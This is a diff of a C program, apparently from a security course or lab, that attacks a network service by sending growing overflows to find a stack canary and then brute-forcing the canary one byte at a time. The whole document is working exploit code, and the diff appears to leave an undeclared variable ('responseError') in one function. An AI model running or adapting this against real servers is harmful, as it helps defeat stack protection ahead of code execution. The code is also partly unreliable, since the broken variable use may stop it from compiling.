@@ -8,29 +8,13 @@
 //#define PORT (8080)
 #define ARRAY_SIZE (100)
 #define CANARY_SIZE (8)
+#define NULL_BYTE ('\0')
+#define OPAQUE_BYTE ('A')
 
-int createChild(char *input) {
-	pid_t cpid; 
-    int status;
-	char *args[] = {"./vuln", input, NULL};
-    if (fork()== 0) {
-	    execvp(args[0], args);
-		exit(0);
-    } else {
-        cpid = wait(&status); 
-		if (WIFSIGNALED(status)) {
-    		if (WTERMSIG(status) == SIGSEGV){
-				// on seg fault
-				return 1;
-			} else if (WTERMSIG(status) == SIGABRT) {
-				// on stack smashing detected
-				return 2;
-			}
-		}
-		return 0;
-	}	
-}
-
+// connect to the server and send too much data
+// returns -1 if connection fails
+// returns 0 if we successfully read the response
+// returns 1 if there is no response
 int connectAndSend(int sock, struct sockaddr_in serverAddress, char *input, int length) {
 	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) { 
 		printf("\n Socket creation error \n"); 
@@ -54,9 +38,10 @@ int connectAndSend(int sock, struct sockaddr_in serverAddress, char *input, int 
 int getSmashLocation(int sock, struct sockaddr_in serverAddress, char *input) {
 	int i = 0;
 	int childStatus = 0;
-	while (childStatus == 0 && i < ARRAY_SIZE) {
-		input[i] = 'a';
-		childStatus = connectAndSend(sock, serverAddress, input, i + 1);
+	// loop until we find where stack smashing is detected
+	while (responseError == 0 && i < ARRAY_SIZE) {
+		input[i] = OPAQUE_BYTE;
+		responseError = connectAndSend(sock, serverAddress, input, i + 1);
 		i++;
 		printf("%d\n", i);
 	}
@@ -74,12 +59,11 @@ int getOneByte(int sock, struct sockaddr_in serverAddress, char *input, int idx)
 		input[idx] = c;
 
 		// happens if the child doesn't die
-		int childStatus = connectAndSend(sock, serverAddress, input, idx + 1);
-		if (!childStatus) {
+		int responseError = connectAndSend(sock, serverAddress, input, idx + 1);
+		if (!responseError) {
+			// found the correct byte of the canary
 			return (int) c;
 		}
-		//printf("Failed byte: %d\n", c);
-
 	}
 
 	// we were unable to get the next byte of the canary
@@ -108,10 +92,11 @@ int main(int argc, char const *argv[]) {
 	
 	unsigned char input[ARRAY_SIZE];
 	for (int i = 0; i < ARRAY_SIZE; i++) {
-		input[i] = '\0';
+		input[i] = NULL_BYTE;
 	}
+	// find the start of the canary
 	int smashLoc = getSmashLocation(sock, serverAddress, input);
-	input[smashLoc - 1] = '\0';
+	input[smashLoc - 1] = NULL_BYTE;
 	
 	char canary[CANARY_SIZE];	
 	printf("Canary hex: ");
